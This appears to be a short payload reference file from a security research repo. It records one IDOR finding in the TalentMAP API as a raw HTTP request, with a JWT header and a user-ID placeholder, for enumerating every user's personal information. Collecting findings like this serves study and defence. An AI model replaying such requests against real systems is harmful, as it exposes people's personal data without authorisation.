# Payloads — jwt

_Verbatim payload / request patterns extracted from findings in this repo. Nothing invented._

## 1. IDOR in TalentMAP API can be abused to enumerate personal information of all the users
- Source: `telegram writeups (verbatim excerpts)`

```
GET /api/v1/permission/user/{USER_ID}/ HTTP/1.1

Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:8000/
JWT: {token}
Connection: close
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
```
